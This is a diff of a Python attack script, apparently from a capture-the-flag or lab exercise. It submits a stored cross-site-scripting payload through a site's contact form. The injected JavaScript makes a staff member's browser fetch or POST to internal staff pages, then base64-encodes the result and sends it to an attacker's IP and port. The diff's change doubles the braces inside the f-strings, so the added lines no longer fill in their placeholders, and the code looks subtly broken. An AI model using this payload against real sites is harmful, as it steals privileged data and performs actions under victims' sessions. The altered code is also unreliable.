@@ -178,9 +178,9 @@ def make_request(path,post, post_data=None, page_id=None):
         "title": "",
     }
     if post:
-        data["message"] =  f"<script>async function y(){{var x = await fetch('{STAFF_URL}/{path}',{{method:'POST', headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},body:'{urlencode(post_data)}'}});await fetch('http://{IP}:{PORT}/recieve', {{method:'POST',body:await JSON.stringify({{'html':btoa(await x.text()),'page':'{page_id}'}})}});}}y();</script>"
+        data["message"] =  f"<script>async function y(){{var x = await fetch('{{STAFF_URL}}/{{path}}',{{method:'POST', headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},body:'{{urlencode(post_data)}}'}});await fetch('http://{{IP}}:{{PORT}}/recieve', {{method:'POST',body:await JSON.stringify({{'html':btoa(await x.text()),'page':'{{page_id}}'}})}});}}y();</script>"
     else:
-        data["message"] = f"<script>async function y(){{var x = await fetch('{STAFF_URL}/{path}');await fetch('http://{IP}:{PORT}/recieve', {{method:'POST',body:await JSON.stringify({{'html':btoa(await x.text()),'page':'{path}'}})}});}}y();</script>"
+        data["message"] = f"<script>async function y(){{var x = await fetch('{{STAFF_URL}}/{{path}}');await fetch('http://{{IP}}:{{PORT}}/recieve', {{method:'POST',body:await JSON.stringify({{'html':btoa(await x.text()),'page':'{{path}}'}})}});}}y();</script>"
     res = requests.post(BASE_URL + "/contact.php",data=data)
     return res.status_code == 200
 
